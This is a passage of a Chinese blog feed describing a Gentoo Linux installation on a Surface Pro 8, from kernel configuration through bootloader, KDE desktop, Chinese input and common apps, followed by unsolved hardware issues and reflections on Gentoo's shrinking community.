网卡驱动独立存在可以正常存活但集成到内核中便无法正常工作的情况）</p></blockquote></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cd</span> /usr/src/linux</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">make defconfig</span><br></code></pre></td></tr></table></figure><p>接下来用 menuconfig 手动改一些选项，其会在已有的 <code>.config</code> 基础上进行修改，这里我们要决定的包括 OpenRC&#x2F;systemd 的选择、常用文件系统支持、额外选一些 Surface 相关的驱动等，具体参见 <a href="https://wiki.gentoo.org/wiki/Handbook:AMD64/Installation/Kernel#Alternative:_Manual_configuration">Gentoo handbook</a>：</p><blockquote><p>在这一步，你可能会需要手动开启 iwlwifi 的编译支持，参见 <a href="https://wiki.gentoo.org/wiki/Iwlwifi">Gentoo wiki - iwlwifi</a> 的 <code>Device driver wilwifi</code>  一节</p><p>在这一步，你还可能会需要手动将网卡固件添加到配置中，参见 <a href="https://wiki.gentoo.org/wiki/Iwlwifi">Gentoo wiki - iwlwifi</a> 的 <code>Firmware</code>  一节<a href="https://wiki.gentoo.org/wiki/Iwlwifi">https://wiki.gentoo.org/wiki/Iwlwifi</a>)</p><blockquote><p>如果不清楚应该添加哪个固件，可以 <code>dmesg | grep -i wifi | grep -i ucode</code> 查看在 LiveISO 当中使用的是哪个</p></blockquote></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">make menuconfig</span><br></code></pre></td></tr></table></figure><p>然后开始编译内核，这可能会需要一定的时间：</p><blockquote><p>实际上在笔者的机器上 8 分钟左右就能完成了，笔者也没想到 <code>1135g7</code> 的性能这么强，可能这就是科技的进步吧 ：）</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">make -j$(<span class="hljs-built_in">nproc</span>) &amp;&amp; make modules_install -j$(<span class="hljs-built_in">nproc</span>)</span><br></code></pre></td></tr></table></figure><p>接下来使用 <a href="https://wiki.gentoo.org/wiki/Installkernel">installkernel</a> 安装内核，这里笔者选择使用 <code>GRUB + systemd</code> ，首先创建文件 <code>/etc/portage/package.use/installkernel</code> 并写入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sys-kernel/installkernel grub dracut<br></code></pre></td></tr></table></figure><p>然后运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-kernel/installkernel</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">make install</span><br></code></pre></td></tr></table></figure><h2 id="配置系统"><a href="#配置系统" class="headerlink" title="配置系统"></a>配置系统</h2><p>首先配置 <code>/etc/fstab</code> ，这个文件决定了在系统启动时哪些分区该被挂载到哪些目录，为了保证挂载的一致性，通常我们会选择使用一个分区的 UUID 进行挂载，而非设备路径，因为在有着多个磁盘的环境中不同磁盘的路径在启动后未必一致</p><blockquote><p>不过因为笔者的 Surface Pro 8 仅有一个盘位，所以是可以使用设备路径进行挂载的，但保险起见还是用 UUID 进行挂载</p></blockquote><p>首先查看不同分区的 UUID：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">blkid</span><br></code></pre></td></tr></table></figure><p>接下来按照分区用途编写 fstab，以笔者的配置为例：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">UUID</span>=f0e95c49-e05d-<span class="hljs-number">4659</span>-a617-bfdaee35af7c none       swap  sw           <span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">UUID</span>=<span class="hljs-number">8317</span>cece-<span class="hljs-number">8</span>c46-<span class="hljs-number">4</span>fec-bdf6-ddab4aa23249 /          ext4  defaults     <span class="hljs-number">0</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">UUID</span>=<span class="hljs-number">5</span>e8624e3-b40e-<span class="hljs-number">4</span>e6c-be02-e72a99e94462 /home      ext4  data=ordered <span class="hljs-number">0</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">UUID</span>=C215-<span class="hljs-number">9</span>C27                            /boot/efi  vfat  utf8         <span class="hljs-number">0</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>然后配置主机名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Surface-Pro-8&quot;</span> &gt; /etc/hostname</span><br></code></pre></td></tr></table></figure><p>配置 DHCP：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask net-misc/dhcpcd</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> dhcpcd</span><br></code></pre></td></tr></table></figure><p>设置 root 密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">passwd</span><br></code></pre></td></tr></table></figure><p>初始化一些配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">systemd-machine-id-setup</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemd-firstboot --prompt</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl preset-all --preset-mode=enable-only</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl preset-all</span><br></code></pre></td></tr></table></figure><blockquote><p>（可选）配置文件索引</p><p>通过空间换时间的方式加快文件搜索速度：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-apps/mlocate</span><br></code></pre></td></tr></table></figure></blockquote><p>配置 shell 自动补全，gentoo 默认使用 bash：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask app-shells/bash-completion</span><br></code></pre></td></tr></table></figure><p>配置时间同步：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask net-misc/chrony</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> chronyd.service</span><br></code></pre></td></tr></table></figure><p>配置文件系统和磁盘相关的一些工具，笔者只用 ext4 和 fat32：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-fs/e2fsprogs</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-fs/dosfstools</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-block/io-scheduler-udev-rules</span><br></code></pre></td></tr></table></figure><p>安装网络相关的一些包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask net-dialup/ppp</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask net-wireless/iw net-wireless/wpa_supplicant</span><br></code></pre></td></tr></table></figure><p>安装 NetworkManager：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask net-misc/networkmanager</span><br></code></pre></td></tr></table></figure><p>完成后我们通过修改 <code>/etc/portage/make.conf</code> 中的 USE flags 添加相关软件对 NetworkManager 的支持：</p><blockquote><p>添加完 USE flags 后别忘了通过如下命令进行更新：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask --changed-use --deep @world</span><br></code></pre></td></tr></table></figure></blockquote><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">USE</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;$&#123;USE&#125; networkmanager&quot;</span><br></code></pre></td></tr></table></figure><p>完成安装后启用对应的 systemd service：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> NetworkManager</span><br></code></pre></td></tr></table></figure><p>安装 sudo ，解注释 <code>%wheel ALL=(ALL:ALL) ALL</code> 所在行： </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask app-admin/sudo</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">visudo</span><br></code></pre></td></tr></table></figure><p>前面我们只配置了 root 用户，所以别忘了配置一个日常用的管理员用户：</p><blockquote><p>这里会报一个 <code>Creating mailbox file: No such file or directory</code> 的错误，可以不用管</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">groupadd arttnba3</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">useradd -g arttnba3 -m -G <span class="hljs-built_in">users</span>,wheel,audio,cdrom,floppy,portage,usb,video -s /bin/bash arttnba3</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">passwd arttnba3</span><br></code></pre></td></tr></table></figure><h2 id="安装-boot-loader"><a href="#安装-boot-loader" class="headerlink" title="安装 boot loader"></a>安装 boot loader</h2><p>按惯例直接用 GRUB 就行， <del>真的会有人去用 systemd-boot 🐴</del> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;GRUB_PLATFORMS=&quot;efi-64&quot;&#x27;</span> &gt;&gt; /etc/portage/make.conf</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask --update --newuse --verbose sys-boot/grub</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-boot/os-prober</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=Gentoo</span><br></code></pre></td></tr></table></figure><p>默认的 grub 主题比较难看，而且在高分辨率屏下看着属实有些难受，所以笔者这里选择安装一个 <a href="">minegrub</a> 主题，首先克隆仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask dev-vcs/git</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cd</span> ~</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/Lxtharia/minegrub-theme.git</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cd</span> ./minegrub-theme</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cp</span> -ruv ./minegrub /boot/grub/themes/</span><br></code></pre></td></tr></table></figure><p>接下来修改 grub 配置文件 <code>/etc/default/grub</code>：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">GRUB_THEME=<span class="hljs-regexp">/boot/g</span>rub<span class="hljs-regexp">/themes/mi</span>negrub/theme.txt<br></code></pre></td></tr></table></figure><p>添加自动更新背景字体的 systemd 服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cp</span> ./minegrub-update.service /etc/systemd/system</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> minegrub-update.service</span><br></code></pre></td></tr></table></figure><p>最后将 grub 配置写入 grub.cfg 中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">grub-mkconfig -o /boot/grub/grub.cfg</span><br></code></pre></td></tr></table></figure><p>最后重启系统，别忘了拔 u 盘：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">exit</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">umount -l /mnt/gentoo/dev&#123;/shm,/pts,&#125;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">umount -R /mnt/gentoo</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">reboot</span><br></code></pre></td></tr></table></figure><p>进入系统后我们用 os-probe 完成双系统引导中对 Windows 的检测以及 grub entry 的生成（当然如果你比较闲也可以手写），这里别忘了检查 <code>/etc/default/grub</code> 中是否有 <code>GRUB_DISABLE_OS_PROBER=false</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">grub-mkconfig -o /boot/grub/grub.cfg</span><br></code></pre></td></tr></table></figure><h2 id="安装-KDE-Wayland"><a href="#安装-KDE-Wayland" class="headerlink" title="安装 KDE + Wayland"></a>安装 KDE + Wayland</h2><p>首先按惯例连接网络：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nmtui</span><br></code></pre></td></tr></table></figure><p>然后安装  <a href="https://packages.gentoo.org/packages/kde-plasma/plasma-meta">kde-plasma&#x2F;plasma-meta</a> 和  <a href="https://packages.gentoo.org/packages/kde-apps/kde-apps-meta">kde-apps&#x2F;kde-apps-meta</a>，不过不同于其他的滚动发行版（Arch、openSUSE Tumbleweed、Debian Sid 等）或是贴近上游的常规发行版（如 Fedora Spin），Gentoo 滚得比较慢，目前 stable 分支还停留在 KDE 5.27：</p><blockquote><p>如果你不想安装其中的部分组件，可以非常轻松地通过 USE flag 进行定义，例如 <code>USE=&quot;kde-plasma/plasma-meta -xwayland&quot;</code> 将不会安装 <code>xwayland</code> ，通过 <code>-sddm</code> flag 也可以将默认的 sddm 替换为 lightdm，可用的 USE flag 详见 <a href="https://wiki.gentoo.org/wiki/KDE">Gentoo wiki</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask kde-plasma/plasma-meta</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask kde-apps/kde-apps-meta</span><br></code></pre></td></tr></table></figure><blockquote><p>如果你和笔者一样使用类似 Surface Pro 的性能比较低下的笔记本，那么这个编译会耗费相当长的时间（至少数个小时），正所谓 <code>“一杯茶，一包烟，Gentoo编译一整天”</code> （笑）</p></blockquote><p>plasma-meta 包自带依赖 sddm ，直接启用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now sddm.service</span><br></code></pre></td></tr></table></figure><p>最后进入到大家熟悉的 KDE 桌面，非常好的是默认使用 wayland，但非常坏的是 Plasma 6 在各大发行版都铺开了的时候 Gentoo 这边还停在 <code>5.27</code> ：</p><p><img src="https://s2.loli.net/2024/05/06/kdpR871gunKx4wt.png"></p><blockquote><p>需要注意的是 Linux on Surface 由于缺少相应的触摸板驱动，触摸板使用体验极其糟糕，在系统设置中也无法被检测为触摸板</p></blockquote><h2 id="安装中文字体与输入法"><a href="#安装中文字体与输入法" class="headerlink" title="安装中文字体与输入法"></a>安装中文字体与输入法</h2><p>首先安装中文字体，毕竟大家都不喜欢看到一大片方块：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask media-fonts/arphicfonts</span><br></code></pre></td></tr></table></figure><p>中文输入法按惯例选择来自 Gentoo 中文社区的 fcitx ，不过默认被 masked 了，得先 unmasked 一下：</p><blockquote><p>如果没有，检查一下你的 <code>gentoo-zh</code> 仓库是否启用成功</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask --autounmask app-i18n/fcitx-meta</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo dispatch-conf <span class="hljs-comment"># 这里直接 u 就好</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask app-i18n/fcitx-meta app-i18n/fcitx-chinese-addons</span><br></code></pre></td></tr></table></figure><p>最后按惯例在设置的 <code>virtual keyboard</code> 里选中 <code>fcitx5</code> ，然后右键 panel 的小企鹅图标找 <code>Pinyin</code> 即可：</p><p><img src="https://s2.loli.net/2024/05/08/Fau4LnKdUomslJY.jpg" alt="image.png"></p><blockquote><p>笔者不得不吐槽的一句是软件包非常老，不过这可能也是相当多开源社区存在的问题了，<code>维护人员越来越少+用户出走</code> 逐渐形成恶性循环，马太效应诚不我欺.jpg</p></blockquote><h2 id="安装常用软件"><a href="#安装常用软件" class="headerlink" title="安装常用软件"></a>安装常用软件</h2><blockquote><p>因为笔者没有协议洁癖所以前面设置了接受所有协议，如果你有但是又需要安装部分软件则需要参照 wiki 手动修改 <code>/etc/portage/package.license</code> ：）</p></blockquote><p>首先是 chrome，有社区从 deb 重新打的包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask www-client/google-chrome</span><br></code></pre></td></tr></table></figure><p>以及 vscode：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask app-editors/vscode</span><br></code></pre></td></tr></table></figure><p>flatpak 用以补充一些 Gentoo 上没有的软件包：</p><blockquote><p>如果你的肉身在中国大陆，flatpak 的使用可能会存在一些困难（笔者不确定是否完全阻断），可以提前在 shell 中导入代理配置，例如 <code>export https_proxy=&quot;http://127.0.0.1:11451&quot;</code></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask sys-apps/flatpak</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">flatpak remote-add --user --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo</span><br></code></pre></td></tr></table></figure><p>然后是中国大陆这边常用的微信，我们可以直接从 flathub 安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">flatpak install com.tencent.WeChat.flatpak</span><br></code></pre></td></tr></table></figure><p>QQ Linux 版提供了 AppImage 可用，不过还需要提前安个依赖：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask app-crypt/mit-krb5</span><br></code></pre></td></tr></table></figure><p>之后随便放到个目录里然后写个 shortcut 放到 <code>~/.local/share/applications</code> 下就行：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Desktop Entry]</span><br><span class="hljs-attr">Name</span>=QQ<br><span class="hljs-attr">GenericName</span>=Tencent QQ<br><span class="hljs-attr">Exec</span>=/home/arttnba3/Applications/QQ/QQ_3.<span class="hljs-number">2.7</span>_240422_x<span class="hljs-number">86_64_01</span>.appimage<br><span class="hljs-attr">Version</span>=<span class="hljs-number">3.2</span>.<span class="hljs-number">7.240422</span><br><span class="hljs-attr">Type</span>=Application<br><span class="hljs-attr">Categories</span>=Network<span class="hljs-comment">;</span><br><span class="hljs-attr">Terminal</span>=<span class="hljs-literal">false</span><br><span class="hljs-attr">Icon</span>=com.qq.QQ<br></code></pre></td></tr></table></figure><h1 id="0x03-遇到的一些问题"><a href="#0x03-遇到的一些问题" class="headerlink" title="0x03. 遇到的一些问题"></a>0x03. 遇到的一些问题</h1><h2 id="触摸板驱动问题"><a href="#触摸板驱动问题" class="headerlink" title="触摸板驱动问题"></a>触摸板驱动问题</h2><p>主要表现：</p><ul><li>启动后点按有效，但是多指手势（如双指&#x3D;&#x3D;右键）无效</li><li>按下触摸板左右键后<strong>点按失效</strong></li><li>在 KDE 系统设置中无法检测到触摸板</li></ul><p>基本上只能当作一个最简陋的触摸板来用，笔者最初感觉主要可能是微软触摸板缺少驱动的问题，毕竟在安装 Windows 时在没更新驱动前也没法用键盘和触摸板（ <del>微软怎么天天搞特殊，忍不了一点，真的有必要🐴</del> ）</p><p><strong>但是，笔者在 openSUSE Tumbleweed on Surface 中可以正常使用触摸板及多指手势</strong> ，那这就有意思了，这么看起来似乎是笔者在编译内核时并未将部分必须的驱动给编译进去，又或是没有安装部分必须的软件，笔者更倾向于前者的缘故🤔</p><p>最后的解决方案是编译内核时选择默认的配置（<code>defconfig</code> ）而非 <code>allmodconfig</code> ，暂且不知道为什么后者虽然名义上是尽可能开启多的编译选项但实际上却比默认配置少很多：（</p><h2 id="摄像头无法使用（not-solved）"><a href="#摄像头无法使用（not-solved）" class="headerlink" title="摄像头无法使用（not solved）"></a>摄像头无法使用（not solved）</h2><p>应该也是经典的缺驱动问题， <del>这就是你 Surface Pro 的屏摄像头啊，你们有没有这样的摄像头啊，真是摄摄像像又头头啊</del></p><h2 id="休眠无法正常唤醒（partially-solved）"><a href="#休眠无法正常唤醒（partially-solved）" class="headerlink" title="休眠无法正常唤醒（partially solved）"></a>休眠无法正常唤醒（partially solved）</h2><p>放个一会整个💻就睡死了，按键盘没法唤醒，最快的解决方案是把键盘拔了再重新插上， <del>这就是你 Surface Pro 的键盘啊，你们有没有这样的键盘啊，真是键键又盘盘啊</del></p><h2 id="Surface-Pen-无法使用（not-solved）"><a href="#Surface-Pen-无法使用（not-solved）" class="headerlink" title="Surface Pen 无法使用（not solved）"></a>Surface Pen 无法使用（not solved）</h2><p>应该也是经典的缺驱动问题， <del>不过真的有人会有在 Linux on Surface 上使用 Surface Pen 的需求🐴</del> </p><h2 id="触屏无法正常使用（not-solved）"><a href="#触屏无法正常使用（not-solved）" class="headerlink" title="触屏无法正常使用（not solved）"></a>触屏无法正常使用（not solved）</h2><p>应该也是经典的缺驱动问题，Surface Pro 支持十点触控的高素质屏幕几乎成了摆设， <del>这就是你 Surface Pro 的屏幕啊，你们有没有这样的屏幕啊，真是屏屏又幕幕啊</del></p><h1 id="0xFF-写在结束之后…"><a href="#0xFF-写在结束之后…" class="headerlink" title="0xFF. 写在结束之后…"></a>0xFF. 写在结束之后…</h1><p>Distro hopping 的狂欢之火燃尽之后，剩下的似乎总是只有一地的灰烬，在笔者看来 <strong>Gentoo Linux 在安装流程上其实和 Arch Linux 基本差不多</strong>，所以对于笔者而言还是 <em>比较轻车熟路的</em> ，但在尝试了几小时 Gentoo Linux 后，笔者最终还是选择暂且重新装回 openSUSE Tumbleweed，触摸板一开始就是正常可用的，也没有休眠醒不来的问题，甚至触屏功能在安装了社区提供的 <a href="https://github.com/linux-surface/linux-surface">linux-surface</a> 包之后也正常可用了，唯一的遗憾就是 Surface Pen 与摄像头依旧没法工作，但其他的一切就像你在 Surface 上使用 Windows 那样自然与舒适</p><p><img src="https://s2.loli.net/2024/05/09/dnEDHtBzY7oOxCf.jpg" alt="舒舒又适适，但可惜的是电池健康在经历笔者大四一年的蹂躏之后已经只剩不到 90 了"></p><p>在回到了大蜥蜴温暖的怀抱当中后，笔者不禁思考：究竟是 Surface 这一特殊设备与 Gentoo 八字不合，还是笔者与 Gentoo Linux 在相性上不符呢？笔者自然不希望答案会是后者，但当笔者尝试在另一台旧笔记本上安装 Gentoo Linux 并再次碰到各种问题（例如 Dolphin 和触摸板无法正常工作）时，<strong>笔者不得不承认或许笔者对 Linux 的了解确实还不够深入</strong>，而这样的两段安装经历也让笔者暂且打消了将主力操作系统从 openSUSE Tumbleweed 换成 Gentoo 的念头</p><blockquote><p>当然，笔者的主力系统最后确乎迁移去了 Gentoo，以及笔者的 openSUSE Tumbleweed 的引导被 Windows 更新干废了的事情，又是另一个故事了…</p></blockquote><p>除此之外，Gentoo 的各种优点 <em>似乎也没有理想中的那么好</em> ，作为一个滚动发行版，Gentoo 明显是没有 Arch、openSUSE Tumbleweed、Fedora 这样紧贴上游的（当然，如果能实现所谓“调试好了再发布”，那在能确保稳定性的情况下软件包旧一点其实无所谓，但事实上他们似乎并没有能做到这一点）； <code>USE flag</code> 等配置听起来舒服，但是大部分情况下其实并不需要这样的特性（<strong>但少部分情况下你真的需要的时候真的非常爽，是其他发行版没法带给你的体验</strong>），和其他发行版的包管理器的使用体验拉不开太大的差距（当然，大部分情况下一个包管理器又能想要多不一样的体验呢？）；Gentoo wiki 以前一直都被吹嘘能和 Arch wiki 有得一拼，但真正用起来能清晰感受到在内容上前者很明显差了后者好几个档次……</p><p>但这些其实都是小问题，毕竟 Linux 用户和苹果用户一样有着非常强的自适应性，尤其是在使用 Arch&#x2F;Gentoo 这样的高度自定义的发行版的时候，出现问题了大家总会第一时间自适应地认为“是不是自己什么地方没有配置好”，可惜 Gentoo 社区一直在走下坡路却是一个不争的事实，虽然 Gentoo 听起来似乎有着各式各样不同的优点， <strong>但使用的人数确乎一直在慢慢减少，也很少有新鲜血液加入，因此很多软件包也没人打，在论坛问问题也没人回复，这又导致没人愿意继续用 Gentoo</strong> ——对于 Gentoo 社区所遇到的“马太效应“的问题，笔者思考了许久，感觉似乎没有一个比较好的解决方案，而这似乎是所有规模比较小的发行版都会遇到的问题，发行版用的人少导致社区缺少人维护从而导致系统没有那么好用，系统可用性的降低又使得人员出走，最后“强者愈强，弱者愈弱”</p><p>——而对于这个不得不被正视的问题，<strong>社区除了等死以外似乎并没有什么能做的事情</strong>，但同样是支持高度定制的系统， <strong>Gentoo 和 Arch 的命运为什么差得越来越多了呢？</strong></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Gentoo 和 openSUSE Tumbleweed 相比，那我还是觉得我们 Gentoo 牛批&lt;/p&gt;</summary>
    
    
    
    <category term="DISTRO" scheme="https://arttnba3.github.io/categories/DISTRO/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Gentoo Linux" scheme="https://arttnba3.github.io/tags/Gentoo-Linux/"/>
    
  </entry>
  
  <entry>
    <title>【PWN.0x03】Linux x86 用户态 Pwn 基本环境搭建</title>
    <link href="https://arttnba3.github.io/2024/03/31/PWN-0X03-USERMODE-ENV/"/>
    <id>https://arttnba3.github.io/2024/03/31/PWN-0X03-USERMODE-ENV/</id>
    <published>2024-03-31T04:21:45.000Z</published>
